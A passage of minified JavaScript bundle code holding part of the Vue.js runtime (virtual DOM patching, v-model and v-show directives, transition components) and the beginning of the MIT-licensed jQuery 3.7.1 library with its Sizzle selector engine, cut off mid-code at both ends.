h(n,e,t){i(n)&&(i(t)?p.parentNode(t)===n&&p.insertBefore(n,e,t):p.appendChild(n,e))}function g(n,e,t){if(r(e)){0;for(var a=0;a<e.length;++a)u(e[a],t,n.elm,null,!0,e,a)}else l(n.text)&&p.appendChild(n.elm,p.createTextNode(String(n.text)))}function f(n){for(;n.componentInstance;)n=n.componentInstance._vnode;return i(n.tag)}function b(n,t){for(var r=0;r<a.create.length;++r)a.create[r](Ca,n);i(e=n.data.hook)&&(i(e.create)&&e.create(Ca,n),i(e.insert)&&t.push(n))}function v(n){var e;if(i(e=n.fnScopeId))p.setStyleScope(n.elm,e);else for(var t=n;t;)i(e=t.context)&&i(e=e.$options._scopeId)&&p.setStyleScope(n.elm,e),t=t.parent;i(e=Ke)&&e!==n.context&&e!==n.fnContext&&i(e=e.$options._scopeId)&&p.setStyleScope(n.elm,e)}function x(n,e,t,a,r,o){for(;a<=r;++a)u(t[a],o,n,e,!1,t,a)}function w(n){var e,t,r=n.data;if(i(r))for(i(e=r.hook)&&i(e=e.destroy)&&e(n),e=0;e<a.destroy.length;++e)a.destroy[e](n);if(i(e=n.children))for(t=0;t<n.children.length;++t)w(n.children[t])}function k(n,e,t){for(;e<=t;++e){var a=n[e];i(a)&&(i(a.tag)?(S(a),w(a)):d(a.elm))}}function S(n,e){if(i(e)||i(n.data)){var t,r=a.remove.length+1;for(i(e)?e.listeners+=r:e=function(n,e){function t(){0==--t.listeners&&d(n)}return t.listeners=e,t}(n.elm,r),i(t=n.componentInstance)&&i(t=t._vnode)&&i(t.data)&&S(t,e),t=0;t<a.remove.length;++t)a.remove[t](n,e);i(t=n.data.hook)&&i(t=t.remove)?t(n,e):e()}else d(n.elm)}function C(n,e,t,a){for(var r=t;r<a;r++){var o=e[r];if(i(o)&&ja(n,o))return r}}function T(n,e,t,r,l,c){if(n!==e){i(e.elm)&&i(r)&&(e=r[l]=bn(e));var d=e.elm=n.elm;if(s(n.isAsyncPlaceholder))i(e.asyncFactory.resolved)?A(n.elm,e,t):e.isAsyncPlaceholder=!0;else if(s(e.isStatic)&&s(n.isStatic)&&e.key===n.key&&(s(e.isCloned)||s(e.isOnce)))e.componentInstance=n.componentInstance;else{var m,h=e.data;i(h)&&i(m=h.hook)&&i(m=m.prepatch)&&m(n,e);var g=n.children,b=e.children;if(i(h)&&f(e)){for(m=0;m<a.update.length;++m)a.update[m](n,e);i(m=h.hook)&&i(m=m.update)&&m(n,e)}o(e.text)?i(g)&&i(b)?g!==b&&function(n,e,t,a,r){var s,l,c,d=0,m=0,h=e.length-1,g=e[0],f=e[h],b=t.length-1,v=t[0],y=t[b],w=!r;for(0;d<=h&&m<=b;)o(g)?g=e[++d]:o(f)?f=e[--h]:ja(g,v)?(T(g,v,a,t,m),g=e[++d],v=t[++m]):ja(f,y)?(T(f,y,a,t,b),f=e[--h],y=t[--b]):ja(g,y)?(T(g,y,a,t,b),w&&p.insertBefore(n,g.elm,p.nextSibling(f.elm)),g=e[++d],y=t[--b]):ja(f,v)?(T(f,v,a,t,m),w&&p.insertBefore(n,f.elm,g.elm),f=e[--h],v=t[++m]):(o(s)&&(s=Pa(e,d,h)),o(l=i(v.key)?s[v.key]:C(v,e,d,h))?u(v,a,n,g.elm,!1,t,m):ja(c=e[l],v)?(T(c,v,a,t,m),e[l]=void 0,w&&p.insertBefore(n,c.elm,g.elm)):u(v,a,n,g.elm,!1,t,m),v=t[++m]);d>h?x(n,o(t[b+1])?null:t[b+1].elm,t,m,b,a):m>b&&k(e,d,h)}(d,g,b,t,c):i(b)?(i(n.text)&&p.setTextContent(d,""),x(d,null,b,0,b.length-1,t)):i(g)?k(g,0,g.length-1):i(n.text)&&p.setTextContent(d,""):n.text!==e.text&&p.setTextContent(d,e.text),i(h)&&i(m=h.hook)&&i(m=m.postpatch)&&m(n,e)}}}function j(n,e,t){if(s(t)&&i(n.parent))n.parent.data.pendingInsert=e;else for(var a=0;a<e.length;++a)e[a].data.hook.insert(e[a])}var P=y("attrs,class,staticClass,staticStyle,key");function A(n,e,t,a){var r,o=e.tag,l=e.data,c=e.children;if(a=a||l&&l.pre,e.elm=n,s(e.isComment)&&i(e.asyncFactory))return e.isAsyncPlaceholder=!0,!0;if(i(l)&&(i(r=l.hook)&&i(r=r.init)&&r(e,!0),i(r=e.componentInstance)))return m(e,t),!0;if(i(o)){if(i(c))if(n.hasChildNodes())if(i(r=l)&&i(r=r.domProps)&&i(r=r.innerHTML)){if(r!==n.innerHTML)return!1}else{for(var p=!0,d=n.firstChild,u=0;u<c.length;u++){if(!d||!A(d,c[u],t,a)){p=!1;break}d=d.nextSibling}if(!p||d)return!1}else g(e,c,t);if(i(l)){var h=!1;for(var f in l)if(!P(f)){h=!0,b(e,t);break}!h&&l.class&&$e(l.class)}}else n.data!==e.text&&(n.data=e.text);return!0}return function(n,e,t,r){if(!o(e)){var l,c=!1,d=[];if(o(n))c=!0,u(e,d);else{var m=i(n.nodeType);if(!m&&ja(n,e))T(n,e,d,null,null,r);else{if(m){if(1===n.nodeType&&n.hasAttribute("data-server-rendered")&&(n.removeAttribute("data-server-rendered"),t=!0),s(t)&&A(n,e,d))return j(e,d,!0),n;l=n,n=new hn(p.tagName(l).toLowerCase(),{},[],void 0,l)}var h=n.elm,g=p.parentNode(h);if(u(e,d,h._leaveCb?null:g,p.nextSibling(h)),i(e.parent))for(var b=e.parent,v=f(e);b;){for(var y=0;y<a.destroy.length;++y)a.destroy[y](b);if(b.elm=e.elm,v){for(var x=0;x<a.create.length;++x)a.create[x](Ca,b);var S=b.data.hook.insert;if(S.merged)for(var C=S.fns.slice(1),P=0;P<C.length;P++)C[P]()}else ka(b);b=b.parent}i(g)?k([n],0,0):i(n.tag)&&w(n)}}return j(e,d,c),e.elm}i(n)&&w(n)}}({nodeOps:xa,modules:[Ma,qa,Qa,Ka,lr,G?{create:Ir,activate:Ir,remove:function(n,e){!0!==n.data.show?Er(n,e):e()}}:{}].concat(Da)});Z&&document.addEventListener("selectionchange",(function(){var n=document.activeElement;n&&n.vmodel&&qr(n,"input")}));var Dr={inserted:function(n,e,t,a){"select"===t.tag?(a.elm&&!a.elm._vOptions?Qn(t,"postpatch",(function(){Dr.componentUpdated(n,e,t)})):Fr(n,e,t.context),n._vOptions=[].map.call(n.options,Mr)):("textarea"===t.tag||ya(n.type))&&(n._vModifiers=e.modifiers,e.modifiers.lazy||(n.addEventListener("compositionstart",Nr),n.addEventListener("compositionend",Rr),n.addEventListener("change",Rr),Z&&(n.vmodel=!0)))},componentUpdated:function(n,e,t){if("select"===t.tag){Fr(n,e,t.context);var a=n._vOptions,r=n._vOptions=[].map.call(n.options,Mr);if(r.some((function(n,e){return!L(n,a[e])})))(n.multiple?e.value.some((function(n){return Lr(n,r)})):e.value!==e.oldValue&&Lr(e.value,r))&&qr(n,"change")}}};function Fr(n,e,t){Or(n,e,t),(K||Y)&&setTimeout((function(){Or(n,e,t)}),0)}function Or(n,e,t){var a=e.value,r=n.multiple;if(!r||Array.isArray(a)){for(var o,i,s=0,l=n.options.length;s<l;s++)if(i=n.options[s],r)o=M(a,Mr(i))>-1,i.selected!==o&&(i.selected=o);else if(L(Mr(i),a))return void(n.selectedIndex!==s&&(n.selectedIndex=s));r||(n.selectedIndex=-1)}}function Lr(n,e){return e.every((function(e){return!L(e,n)}))}function Mr(n){return"_value"in n?n._value:n.value}function Nr(n){n.target.composing=!0}function Rr(n){n.target.composing&&(n.target.composing=!1,qr(n.target,"input"))}function qr(n,e){var t=document.createEvent("HTMLEvents");t.initEvent(e,!0,!0),n.dispatchEvent(t)}function Ur(n){return!n.componentInstance||n.data&&n.data.transition?n:Ur(n.componentInstance._vnode)}var $r={model:Dr,show:{bind:function(n,e,t){var a=e.value,r=(t=Ur(t)).data&&t.data.transition,o=n.__vOriginalDisplay="none"===n.style.display?"":n.style.display;a&&r?(t.data.show=!0,Ar(t,(function(){n.style.display=o}))):n.style.display=a?o:"none"},update:function(n,e,t){var a=e.value;!a!=!e.oldValue&&((t=Ur(t)).data&&t.data.transition?(t.data.show=!0,a?Ar(t,(function(){n.style.display=n.__vOriginalDisplay})):Er(t,(function(){n.style.display="none"}))):n.style.display=a?n.__vOriginalDisplay:"none")},unbind:function(n,e,t,a,r){r||(n.style.display=n.__vOriginalDisplay)}}},Wr={name:String,appear:Boolean,css:Boolean,mode:String,type:String,enterClass:String,leaveClass:String,enterToClass:String,leaveToClass:String,enterActiveClass:String,leaveActiveClass:String,appearClass:String,appearActiveClass:String,appearToClass:String,duration:[Number,String,Object]};function Hr(n){var e=n&&n.componentOptions;return e&&e.Ctor.options.abstract?Hr(Te(e.children)):n}function Vr(n){var e={},t=n.$options;for(var a in t.propsData)e[a]=n[a];var r=t._parentListeners;for(var a in r)e[j(a)]=r[a];return e}function Jr(n,e){if(/\d-keep-alive$/.test(e.tag))return n("keep-alive",{props:e.componentOptions.propsData})}var Qr=function(n){return n.tag||ge(n)},Gr=function(n){return"show"===n.name},Xr={name:"transition",props:Wr,abstract:!0,render:function(n){var e=this,t=this.$slots.default;if(t&&(t=t.filter(Qr)).length){0;var a=this.mode;0;var r=t[0];if(function(n){for(;n=n.parent;)if(n.data.transition)return!0}(this.$vnode))return r;var o=Hr(r);if(!o)return r;if(this._leaving)return Jr(n,r);var i="__transition-".concat(this._uid,"-");o.key=null==o.key?o.isComment?i+"comment":i+o.tag:l(o.key)?0===String(o.key).indexOf(i)?o.key:i+o.key:o.key;var s=(o.data||(o.data={})).transition=Vr(this),c=this._vnode,p=Hr(c);if(o.data.directives&&o.data.directives.some(Gr)&&(o.data.show=!0),p&&p.data&&!function(n,e){return e.key===n.key&&e.tag===n.tag}(o,p)&&!ge(p)&&(!p.componentInstance||!p.componentInstance._vnode.isComment)){var d=p.data.transition=I({},s);if("out-in"===a)return this._leaving=!0,Qn(d,"afterLeave",(function(){e._leaving=!1,e.$forceUpdate()})),Jr(n,r);if("in-out"===a){if(ge(o))return c;var u,m=function(){u()};Qn(s,"afterEnter",m),Qn(s,"enterCancelled",m),Qn(d,"delayLeave",(function(n){u=n}))}}return r}}},Kr=I({tag:String,moveClass:String},Wr);function Zr(n){n.elm._moveCb&&n.elm._moveCb(),n.elm._enterCb&&n.elm._enterCb()}function Yr(n){n.data.newPos=n.elm.getBoundingClientRect()}function no(n){var e=n.data.pos,t=n.data.newPos,a=e.left-t.left,r=e.top-t.top;if(a||r){n.data.moved=!0;var o=n.elm.style;o.transform=o.WebkitTransform="translate(".concat(a,"px,").concat(r,"px)"),o.transitionDuration="0s"}}delete Kr.mode;var eo={Transition:Xr,TransitionGroup:{props:Kr,beforeMount:function(){var n=this,e=this._update;this._update=function(t,a){var r=Ze(n);n.__patch__(n._vnode,n.kept,!1,!0),n._vnode=n.kept,r(),e.call(n,t,a)}},render:function(n){for(var e=this.tag||this.$vnode.data.tag||"span",t=Object.create(null),a=this.prevChildren=this.children,r=this.$slots.default||[],o=this.children=[],i=Vr(this),s=0;s<r.length;s++){if((p=r[s]).tag)if(null!=p.key&&0!==String(p.key).indexOf("__vlist"))o.push(p),t[p.key]=p,(p.data||(p.data={})).transition=i;else;}if(a){var l=[],c=[];for(s=0;s<a.length;s++){var p;(p=a[s]).data.transition=i,p.data.pos=p.elm.getBoundingClientRect(),t[p.key]?l.push(p):c.push(p)}this.kept=n(e,null,l),this.removed=c}return n(e,null,o)},updated:function(){var n=this.prevChildren,e=this.moveClass||(this.name||"v")+"-move";n.length&&this.hasMove(n[0].elm,e)&&(n.forEach(Zr),n.forEach(Yr),n.forEach(no),this._reflow=document.body.offsetHeight,n.forEach((function(n){if(n.data.moved){var t=n.elm,a=t.style;wr(t,e),a.transform=a.WebkitTransform=a.transitionDuration="",t.addEventListener(fr,t._moveCb=function n(a){a&&a.target!==t||a&&!/transform$/.test(a.propertyName)||(t.removeEventListener(fr,n),t._moveCb=null,kr(t,e))})}})))},methods:{hasMove:function(n,e){if(!hr)return!1;if(this._hasMove)return this._hasMove;var t=n.cloneNode();n._transitionClasses&&n._transitionClasses.forEach((function(n){dr(t,n)})),pr(t,e),t.style.display="none",this.$el.appendChild(t);var a=Tr(t);return this.$el.removeChild(t),this._hasMove=a.hasTransform}}}};Jt.config.mustUseProp=function(n,e,t){return"value"===t&&ta(n)&&"button"!==e||"selected"===t&&"option"===n||"checked"===t&&"input"===n||"muted"===t&&"video"===n},Jt.config.isReservedTag=ba,Jt.config.isReservedAttr=ea,Jt.config.getTagNamespace=function(n){return fa(n)?"svg":"math"===n?"math":void 0},Jt.config.isUnknownElement=function(n){if(!G)return!0;if(ba(n))return!1;if(n=n.toLowerCase(),null!=va[n])return va[n];var e=document.createElement(n);return n.indexOf("-")>-1?va[n]=e.constructor===window.HTMLUnknownElement||e.constructor===window.HTMLElement:va[n]=/HTMLUnknownElement/.test(e.toString())},I(Jt.options.directives,$r),I(Jt.options.components,eo),Jt.prototype.__patch__=G?zr:D,Jt.prototype.$mount=function(n,e){return function(n,e,t){var a;n.$el=e,n.$options.render||(n.$options.render=gn),et(n,"beforeMount"),a=function(){n._update(n._render(),t)},new Ve(n,a,D,{before:function(){n._isMounted&&!n._isDestroyed&&et(n,"beforeUpdate")}},!0),t=!1;var r=n._preWatchers;if(r)for(var o=0;o<r.length;o++)r[o].run();return null==n.$vnode&&(n._isMounted=!0,et(n,"mounted")),n}(this,n=n&&G?function(n){if("string"==typeof n){var e=document.querySelector(n);return e||document.createElement("div")}return n}(n):void 0,e)},G&&setTimeout((function(){$.devtools&&ln&&ln.emit("init",Jt)}),0)},function(n,e,t){"use strict";function a(n,e,t,a,r,o,i,s){var l,c="function"==typeof n?n.options:n;if(e&&(c.render=e,c.staticRenderFns=t,c._compiled=!0),a&&(c.functional=!0),o&&(c._scopeId="data-v-"+o),i?(l=function(n){(n=n||this.$vnode&&this.$vnode.ssrContext||this.parent&&this.parent.$vnode&&this.parent.$vnode.ssrContext)||"undefined"==typeof __VUE_SSR_CONTEXT__||(n=__VUE_SSR_CONTEXT__),r&&r.call(this,n),n&&n._registeredComponents&&n._registeredComponents.add(i)},c._ssrRegister=l):r&&(l=s?function(){r.call(this,(c.functional?this.parent:this).$root.$options.shadowRoot)}:r),l)if(c.functional){c._injectStyles=l;var p=c.render;c.render=function(n,e){return l.call(e),p(n,e)}}else{var d=c.beforeCreate;c.beforeCreate=d?[].concat(d,l):[l]}return{exports:n,options:c}}t.d(e,"a",(function(){return a}))},function(n,e,t){var a;
/*!
 * jQuery JavaScript Library v3.7.1
 * https://jquery.com/
 *
 * Copyright OpenJS Foundation and other contributors
 * Released under the MIT license
 * https://jquery.org/license
 *
 * Date: 2023-08-28T13:37Z
 */!function(e,t){"use strict";"object"==typeof n.exports?n.exports=e.document?t(e,!0):function(n){if(!n.document)throw new Error("jQuery requires a window with a document");return t(n)}:t(e)}("undefined"!=typeof window?window:this,(function(t,r){"use strict";var o=[],i=Object.getPrototypeOf,s=o.slice,l=o.flat?function(n){return o.flat.call(n)}:function(n){return o.concat.apply([],n)},c=o.push,p=o.indexOf,d={},u=d.toString,m=d.hasOwnProperty,h=m.toString,g=h.call(Object),f={},b=function(n){return"function"==typeof n&&"number"!=typeof n.nodeType&&"function"!=typeof n.item},v=function(n){return null!=n&&n===n.window},y=t.document,x={type:!0,src:!0,nonce:!0,noModule:!0};function w(n,e,t){var a,r,o=(t=t||y).createElement("script");if(o.text=n,e)for(a in x)(r=e[a]||e.getAttribute&&e.getAttribute(a))&&o.setAttribute(a,r);t.head.appendChild(o).parentNode.removeChild(o)}function k(n){return null==n?n+"":"object"==typeof n||"function"==typeof n?d[u.call(n)]||"object":typeof n}var S=/HTML$/i,C=function(n,e){return new C.fn.init(n,e)};function T(n){var e=!!n&&"length"in n&&n.length,t=k(n);return!b(n)&&!v(n)&&("array"===t||0===e||"number"==typeof e&&e>0&&e-1 in n)}function j(n,e){return n.nodeName&&n.nodeName.toLowerCase()===e.toLowerCase()}C.fn=C.prototype={jquery:"3.7.1",constructor:C,length:0,toArray:function(){return s.call(this)},get:function(n){return null==n?s.call(this):n<0?this[n+this.length]:this[n]},pushStack:function(n){var e=C.merge(this.constructor(),n);return e.prevObject=this,e},each:function(n){return C.each(this,n)},map:function(n){return this.pushStack(C.map(this,(function(e,t){return n.call(e,t,e)})))},slice:function(){return this.pushStack(s.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},even:function(){return this.pushStack(C.grep(this,(function(n,e){return(e+1)%2})))},odd:function(){return this.pushStack(C.grep(this,(function(n,e){return e%2})))},eq:function(n){var e=this.length,t=+n+(n<0?e:0);return this.pushStack(t>=0&&t<e?[this[t]]:[])},end:function(){return this.prevObject||this.constructor()},push:c,sort:o.sort,splice:o.splice},C.extend=C.fn.extend=function(){var n,e,t,a,r,o,i=arguments[0]||{},s=1,l=arguments.length,c=!1;for("boolean"==typeof i&&(c=i,i=arguments[s]||{},s++),"object"==typeof i||b(i)||(i={}),s===l&&(i=this,s--);s<l;s++)if(null!=(n=arguments[s]))for(e in n)a=n[e],"__proto__"!==e&&i!==a&&(c&&a&&(C.isPlainObject(a)||(r=Array.isArray(a)))?(t=i[e],o=r&&!Array.isArray(t)?[]:r||C.isPlainObject(t)?t:{},r=!1,i[e]=C.extend(c,o,a)):void 0!==a&&(i[e]=a));return i},C.extend({expando:"jQuery"+("3.7.1"+Math.random()).replace(/\D/g,""),isReady:!0,error:function(n){throw new Error(n)},noop:function(){},isPlainObject:function(n){var e,t;return!(!n||"[object Object]"!==u.call(n))&&(!(e=i(n))||"function"==typeof(t=m.call(e,"constructor")&&e.constructor)&&h.call(t)===g)},isEmptyObject:function(n){var e;for(e in n)return!1;return!0},globalEval:function(n,e,t){w(n,{nonce:e&&e.nonce},t)},each:function(n,e){var t,a=0;if(T(n))for(t=n.length;a<t&&!1!==e.call(n[a],a,n[a]);a++);else for(a in n)if(!1===e.call(n[a],a,n[a]))break;return n},text:function(n){var e,t="",a=0,r=n.nodeType;if(!r)for(;e=n[a++];)t+=C.text(e);return 1===r||11===r?n.textContent:9===r?n.documentElement.textContent:3===r||4===r?n.nodeValue:t},makeArray:function(n,e){var t=e||[];return null!=n&&(T(Object(n))?C.merge(t,"string"==typeof n?[n]:n):c.call(t,n)),t},inArray:function(n,e,t){return null==e?-1:p.call(e,n,t)},isXMLDoc:function(n){var e=n&&n.namespaceURI,t=n&&(n.ownerDocument||n).documentElement;return!S.test(e||t&&t.nodeName||"HTML")},merge:function(n,e){for(var t=+e.length,a=0,r=n.length;a<t;a++)n[r++]=e[a];return n.length=r,n},grep:function(n,e,t){for(var a=[],r=0,o=n.length,i=!t;r<o;r++)!e(n[r],r)!==i&&a.push(n[r]);return a},map:function(n,e,t){var a,r,o=0,i=[];if(T(n))for(a=n.length;o<a;o++)null!=(r=e(n[o],o,t))&&i.push(r);else for(o in n)null!=(r=e(n[o],o,t))&&i.push(r);return l(i)},guid:1,support:f}),"function"==typeof Symbol&&(C.fn[Symbol.iterator]=o[Symbol.iterator]),C.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "),(function(n,e){d["[object "+e+"]"]=e.toLowerCase()}));var P=o.pop,A=o.sort,E=o.splice,_="[\\x20\\t\\r\\n\\f]",B=new RegExp("^"+_+"+|((?:^|[^\\\\])(?:\\\\.)*)"+_+"+$","g");C.contains=function(n,e){var t=e&&e.parentNode;return n===t||!(!t||1!==t.nodeType||!(n.contains?n.contains(t):n.compareDocumentPosition&&16&n.compareDocumentPosition(t)))};var I=/([\0-\x1f\x7f]|^-?\d)|^-$|[^\x80-\uFFFF\w-]/g;function z(n,e){return e?"\0"===n?"�":n.slice(0,-1)+"\\"+n.charCodeAt(n.length-1).toString(16)+" ":"\\"+n}C.escapeSelector=function(n){return(n+"").replace(I,z)};var D=y,F=c;!function(){var n,e,a,r,i,l,c,d,u,h,g=F,b=C.expando,v=0,y=0,x=nn(),w=nn(),k=nn(),S=nn(),T=function(n,e){return n===e&&(i=!0),0},I="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",z="(?:\\\\[\\da-fA-F]{1,6}"+_+"?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+",O="\\["+_+"*("+z+")(?:"+_+"*([*^$|!~]?=)"+_+"*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|("+z+"))|)"+_+"*\\]",L=":("+z+")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|"+O+")*)|.*)\\)|)",M=new RegExp(_+"+","g"),N=new RegExp("^"+_+"*,"+_+"*"),R=new RegExp("^"+_+"*([>+~]|"+_+")"+_+"*"),q=new RegExp(_+"|>"),U=new RegExp(L),$=new RegExp("^"+z+"$"),W={ID:new RegExp("^#("+z+")"),CLASS:new RegExp("^\\.("+z+")"),TAG:new RegExp("^("+z+"|[*])"),ATTR:new RegExp("^"+O),PSEUDO:new RegExp("^"+L),CHILD:new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+_+"*(even|odd|(([+-]|)(\\d*)n|)"+_+"*(?:([+-]|)"+_+"*(\\d+)|))"+_+"*\\)|)","i"),bool:new RegExp("^(?:"+I+")$","i"),needsContext:new RegExp("^"+_+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+_+"*((?:-\\d)?\\d*)"+_+"*\\)|)(?=[^-]|$)","i")},H=/^(?:input|select|textarea|button)$/i,V=/^h\d$/i,J=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,Q=/[+~]/,G=new RegExp("\\\\[\\da-fA-F]{1,6}"+_+"?|\\\\([^\\r\\n\\f])","g"),X=function(n,e){var t="0x"+n.slice(1)-65536;return e||(t<0?String.fromCharCode(t+65536):String.fromCharCode(t>>10|55296,1023&t|56320))},K=function(){cn()},Z=mn((function(n){return!0===n.disabled&&j(n,"fieldset")}),{dir:"parentNode",next:"legend"});try{g.apply(o=s.call(D.childNodes),D.childNodes),o[D.childNodes.length].nodeType}catch(n){g={apply:function(n,e){F.apply(n,s.call(e))},call:function(n){F.apply(n,s.call(arguments,1))}}}function Y(n,e,t,a){var r,o,i,s,c,p,m,h=e&&e.ownerDocument,v=e?e.nodeType:9;if(t=t||[],"string"!=typeof n||!n||1!==v&&9!==v&&11!==v)return t;if(!a&&(cn(e),e=e||l,d)){if(11!==v&&(c=J.exec(n)))if(r=c[1]){if(9===v){if(!(i=e.getElementById(r)))return t;if(i.id===r)return g.call(t,i),t}else if(h&&(i=h.getElementById(r))&&Y.contains(e,i)&&i.id===r)return g.call(t,i),t}else{if(c[2])return g.apply(t,e.getElementsByTagName(n)),t;if((r=c[3])&&e.getElementsByClassName)return g.apply(t,e.getElementsByClassName(r)),t}if(!(S[n+" "]||u&&u.test(n))){if(m=n,h=e,1===v&&(q.test(n)||R.test(n))){for((h=Q.test(n)&&ln(e.parentNode)||e)==e&&f.scope||((s=e.getAttribute("id"))?s=C.escapeSelector(s):e.setAttribute("id",s=b)),o=(p=dn(n)).length;o--;)p[o]=(s?"#"+s:":scope")+" "+un(p[o]);m=p.join(",")}try{return g.apply(t,h.querySelectorAll(m)),t}catch(e){S(n,!0)}finally{s===b&&e.removeAttribute("id")}}}return yn(n.replace(B,"$1"),e,t,a)}function nn(){var n=[];return function t(a,r){return n.push(a+" ")>e.cacheLength&&delete t[n.shift()],t[a+" "]=r}}function en(n){return n[b]=!0,n}function tn(n){var e=l.createElement("fieldset");try{return!!n(e)}catch(n){return!1}finally{e.parentNode&&e.parentNode.removeChild(e),e=null}}function an(n){return function(e){return j(e,"input")&&e.type===n}}function rn(n){return function(e){return(j(e,"input")||j(e,"button"))&&e.type===n}}function on(n){return function(e){return"form"in e?e.parentNode&&!1===e.disabled?"label"in e?"label"in e.parentNode?e.parentNode.disabled===n:e.disabled===n:e.isDisabled===n||e.isDisabled!==!n&&Z(e)===n:e.disabled===n:"label"in e&&e.disabled===n}}function sn(n){return en((function(e){return e=+e,en((function(t,a){for(var r,o=n([],t.length,e),i=o.length;i--;)t[r=o[i]]&&(t[r]=!(a[r]=t[r]))}))}))}function ln(n){return n&&void 0!==n.getElementsByTagName&&n}function cn(n){var t,a=n?n.ownerDocument||n:D;return a!=l&&9===a.nodeType&&a.documentElement?(c=(l=a).documentElement,d=!C.isXMLDoc(l),h=c.matches||c.webkitMatchesSelector||c.msMatchesSelector,c.msMatchesSelector&&D!=l&&(t=l.defaultView)&&t.top!==t&&t.addEventListener("unload",K),f.getById=tn((function(n){return c.appendChild(n).id=C.expando,!l.getElementsByName||!l.getElementsByName(C.expando).length})),f.disconnectedMatch=tn((function(n){return h.call(n,"*")})),f.scope=tn((function(){return l.querySelectorAll(":scope")})),f.cssHas=tn((function(){try{return l.querySelector(":has(*,:jqfake)"),!1}catch(n){return!0}})),f.getById?(e.filter.ID=function(n){var e=n.replace(G,X);return function(n){return n.getAttribute("id")===e}},e.find.ID=function(n,e){if(void 0!==e.getElementById&&d){var t=e.getElementById(n);return t?[t]:[]}}):(e.filter.ID=function(n){var e=n.replace(G,X);return function(n){var t=void 0!==n.getAttributeNode&&n.getAttributeNode("id");return t&&t.value===e}},e.find.ID=function(n,e){if(void 0!==e.getElementById&&d){var t,a,r,o=e.getElementById(n);if(o){if((t=o.getAttributeNode("id"))&&t.value===n)return[o];for(r=e.getElementsByName(n),a=0;o=r[a++];)if((t=o.getAttributeNode("id"))&&t.value===n)return[o]}return[]}}),e.find.TAG=function(n,e){return void 0!==e.getElementsByTagName?e.getElementsByTagName(n):e.querySelectorAll(n)},e.find.CLASS=function(n,e){if(void 0!==e.getElementsByClassName&&d)return e.getElementsByClassName(n)},u=[],tn((function(n){var e;c.appendChild(n).innerHTML="<a id='"+b+"' href='' disabled='disabled'></a><select id='"+b+"-\r\\' disabled='disabled'><option selected=''></option></select>",n.querySelectorAll("[selected]").length||u.push("\\["+_+"*(?:value|"+I+")"),n.querySelectorAll("[id~="+b+"-]").length||u.push("~="),n.querySelectorAll("a#"+b+"+*").length||u.push(".#.+[+~]"),n.querySelectorAll(":checked").length||u.push(":checked"),(e=l.createElement("input")).setAttribute("type","hidden"),n.appendChild(e).setAttribute("name","D"),c.appendChild(n).disabled=!0,2!==n.querySelectorAll(":disabled").length&&u.push(":enabled",":disabled"),(e=l.createElement("input")).setAttribute("name",""),n.appendChild(e),n.querySelectorAll("[name='']").length||u.push("\\["+_+"*name"+_+"*="+_+"*(?:''|\"\")")})),f.cssHas||u.push(":has"),u=u.length&&new RegExp(u.join("|")),T=function(n,e){if(n===e)return i=!0,0;var t=!n.compareDocumentPosition-!e.compareDocumentPosition;return t||(1&(t=(n.ownerDocument||n)==(e.ownerDocument||e)?n.compareDocumentPosition(e):1)||!f.sortDetached&&e.compareDocumentPosition(n)===t?n===l||n.ownerDocument==D&&Y.contains(D,n)?-1:e===l||e.ownerDocument==D&&Y.contains(D,e)?1:r?p.call(r,n)-p.call(r,e):0:4&t?-1:1)},l):l}for(n in Y.matches=function(n,e){return Y(n,null,null,e)},Y.matchesSelector=function(n,e){if(cn(n),d&&!S[e+" "]&&(!u||!u.test(e)))try{var t=h.call(n,e);if(t||f.disconnectedMatch||n.document&&11!==n.document.nodeType)return t}catch(n){S(e,!0)}return Y(e,l,null,[n]).length>0},Y.contains=function(n,e){return(n.ownerDocument||n)!=l&&cn(n),C.contains(n,e)},Y.attr=function(n,t){(n.ownerDocument||n)!=l&&cn(n);var a=e.attrHandle[t.toLowerCase()],r=a&&m.call(e.attrHandle,t.toLowerCase())?a(n,t,!d):void 0;return void 0!==r?r:n.getAttribute(t)},Y.error=function(n){throw new Error("Syntax error, unrecognized expression: "+n)},C.uniqueSort=function(n){var e,t=[],a=0,o=0;if(i=!f.sortStable,r=!f.sortStable&&s.call(n,0),A.call(n,T),i){for(;e=n[o++];)e===n[o]&&(a=t.push(o));for(;a--;)E.call(n,t[a],1)}return r=null,n},C.fn.uniqueSort=function(){return this.pushStack(C.uniqueSort(s.apply(this)))},(e=C.expr={cacheLength:50,createPseudo:en,match:W,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(n){return n[1]=n[1].replace(G,X),n[3]=(n[3]||n[4]||n[5]||"").replace(G,X),"~="===n[2]&&(n[3]=" "+n[3]+" "),n.slice(0,4)},CHILD:function(n){return n[1]=n[1].toLowerCase(),"nth"===n[1].slice(0,3)?(n[3]||Y.error(n[0]),n[4]=+(n[4]?n[5]+(n[6]||1):2*("even"===n[3]||"odd"===n[3])),n[5]=+(n[7]+n[8]||"odd"===n[3])):n[3]&&Y.error(n[0]),n},PSEUDO:function(n){var e,t=!n[6]&&n[2];return W.CHILD.test(n[0])?null:(n[3]?n[2]=n[4]||n[5]||"":t&&U.test(t)&&(e=dn(t,!0))&&(e=t.indexOf(")",t.length-e)-t.length)&&(n[0]=n[0].slice(0,e),n[2]=t.slice(0,e)),n.slice(0,3))}},filter:{TAG:function(n){var e=n.replace(G,X).toLowerCase();return"*"===n?function(){return!0}:function(n){return j(n,e)}},CLASS:function(n){var e=x[n+" "];return e||(e=new RegExp("(^|"+_+")"+n+"("+_+"|$)"))&&x(n,(function(n){return e.test("string"==typeof n.className&&n.className||void 0!==n.getAttribute&&n.getAttribute("class")||"")}))},ATTR:function(n,e,t){return function(a){var r=Y.attr(a,n);return 